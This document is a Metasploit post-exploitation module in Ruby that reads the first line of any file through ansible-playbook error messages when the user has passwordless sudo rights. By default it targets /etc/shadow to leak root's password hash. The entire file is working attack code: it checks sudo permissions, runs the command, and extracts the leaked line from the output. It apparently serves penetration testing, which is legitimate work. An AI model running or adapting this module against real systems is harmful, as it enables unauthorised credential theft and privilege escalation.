##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Auxiliary::Report
  include Msf::Exploit::Local::Ansible

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ansible Playbook Error Message File Reader',
        'Description' => %q{
          This module will read the first line of a file based on an error message from ansible-playbook with sudo privileges.
          ansible-playbook takes a yaml file as input, and if there is an error, such as a non-yaml file, it outputs the line
          where the error occurs. This can be exploited to read the first line of the file, which we'll typically want to read
          /etc/shadow to obtain root's hash.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
          'rioasmara'
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow']),
      ], self.class
    )

    register_advanced_options(
      [
        OptString.new('FULLOUTPUT', [false, 'Show the full output without cleanup', false]),
      ], self.class
    )
  end

  def run
    fail_with(Failure::NotFound, 'Ansible-playbook executable not found') if ansible_playbook_exe.nil?
    fail_with(Failure::NotFound, "Target file to read not found: #{datastore['FILE']}") unless file?(datastore['FILE'])

    # default if we have root and dont need sudo
    cmd = "#{ansible_playbook_exe} #{datastore['FILE']}"

    unless is_root?
      vprint_status('Checking sudo')
      # check we can sudo
      sudo_check = 'sudo -n -l'
      print_status "Executing: #{sudo_check}"
      output = cmd_exec(sudo_check).to_s

      if !output || output.start_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')
        print_error('Current user could not execute sudo -l')
        fail_with(Failure::NoAccess, 'Unable to execute the sudo command')
      end

      can_sudo_playbook = false
      output.lines.each do |line|
        next unless line.include? 'ansible-playbook'
        next unless line.include? 'NOPASSWD'

        can_sudo_playbook = true
      end
      fail_with(Failure::NoAccess, "ansible-playbook can't be run with a passwordless sudo") unless can_sudo_playbook
      print_good('System should be exploitable')
      cmd = "sudo -n #{cmd}"
    end

    print_status "Executing: #{cmd}"
    output = cmd_exec(cmd).to_s

    # output will look similar to this:
    # The offending line appears to be:
    #
    #
    # root:!::0:::::
    # ^ here
    # we want to take the 2nd to last line.
    if datastore['FULLOUTPUT']
      print_good(output)
    else
      print_good(output.lines[-2].strip)
    end
  end
end
